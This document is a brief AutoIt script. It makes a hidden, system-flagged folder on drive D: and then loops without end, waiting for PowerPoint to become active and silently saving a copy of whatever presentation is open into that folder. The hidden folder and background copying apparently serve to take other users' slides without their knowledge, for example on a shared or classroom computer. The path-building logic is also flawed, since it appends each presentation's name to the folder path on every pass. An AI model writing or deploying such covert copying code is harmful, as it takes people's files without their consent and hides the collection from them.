Local $oPPT
Local $MyPath = "D:\09级七年制大四下"
If Not FileExists($MyPath) Then DirCreate($MyPath)
FileGetAttrib($MyPath)
FileSetAttrib($MyPath, "+SH")

While 1
	
	WinWaitActive("[CLASS:PPTFrameClass]", "")
	Sleep(5000)
	$oPPT = ObjGet("", "PowerPoint.Application")
	If IsObj($oPPT) Then $MyPath = $MyPath & "\" & $oPPT.ActivePresentation.Name
	If Not FileExists($MyPath) Then $oPPT.ActivePresentation.SaveCopyAs($MyPath)
WEnd